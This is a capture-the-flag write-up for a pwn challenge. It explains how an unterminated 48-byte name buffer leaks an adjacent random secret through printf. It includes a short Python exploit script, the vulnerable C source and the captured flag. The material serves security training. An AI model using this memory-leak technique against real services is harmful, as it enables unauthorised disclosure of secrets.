@@ -1,0 +1,115 @@
+Can you guess my name?
+
+Category:       pwn (50 points)
+Chall author:   JoshDaBosh
+Writeup author: malfurious
+
+
+
+The problem gives us an ELF binary, it's source code, and a netcat endpoint
+hosting the service.   The program asks us for our name, then asks us to guess
+it's name, which is initialized to random data gathered from /dev/urandom.
+
+All character buffers are allocated to 48 bytes in size, and all input functions
+properly bound memory to avoid buffer overruns.  However, after we enter our
+name, the program prints it back to us with a greeting.  Because the two name
+strings are adjacent in memory, with the user's name coming first, we can leak
+the random service name by filling the user's name buffer completely to avoid
+its NULL terminator.
+
+Take note that the output is appended with a "!" character.  I missed this
+initially, and spent far too long trying to debug the situation.
+
+Our guess is compared to the real service name with strncmp(name, guess, 48) == 0.
+
+Our guess is read by the binary with scanf("%48s[^\n]", guess).  The '[^\n]'
+portion should cause reading to stop at the first newline.  However, this is
+redundant with how %s works anyway.  '%s' stops reading its input at _any_
+whitespace, including:
+
+    0x20    space
+    0x09    horizontal tab
+    0x0a    newline
+    0x0b    vertical tab
+    0x0c    feed
+    0x0d    carriage return
+
+This means that sending the correct guess would be impossible on any run where
+these 6 bytes were present in the random data.  On a lucky run (lacking any of
+the whitespace chars), sending the leaked data will result in the flag being
+printed.
+
+actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}
+
+
+
+Solution (Python/sploit)
+------------------------
+#!/usr/bin/sploit
+from sploit.payload import Payload
+from sploit.until import contains
+io.logonwrite = True
+
+pref = b'Nice to meet you, '
+size = 48
+
+io.write(Payload().rep(b'A', size)())
+
+io.readuntil(contains, pref)
+io.read(size) # our name
+leak = io.read(size)[:-1] # [-1] to strip the trailing '!'
+
+io.writeline(leak)
+
+
+
+Original source (C): whatsmyname.c
+----------------------------------
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+static void generate_name(char *str)
+{
+    FILE *file = fopen("/dev/urandom","r");
+        fgets(str, 48, file);
+        fclose(file);
+}
+
+int main(){
+    char yourName[48];
+    char myName[48];
+
+    char guess[48];
+
+    setbuf(stdout, NULL);
+
+    generate_name(myName);
+
+    printf("Hi! What's your name? ");
+
+    int n = read(0, yourName, 48);
+    if (yourName[n-1] == '\n') yourName[n-1] = '\x00';
+
+    printf("Nice to meet you, %s!\n", yourName);
+
+    puts("Guess my name and you'll get a flag!");
+
+    scanf("%48s[^\n]", guess);
+
+    if (strncmp(myName, guess, 48) == 0){
+        char flag[128];
+
+                FILE *file = fopen("flag.txt","r");
+                if (!file) {
+                    puts("Error: missing flag.txt.");
+                    exit(1);
+                }
+
+                fgets(flag, 128, file);
+                puts(flag);
+    }
+
+    puts("Bye!");
+    return 0;
+}
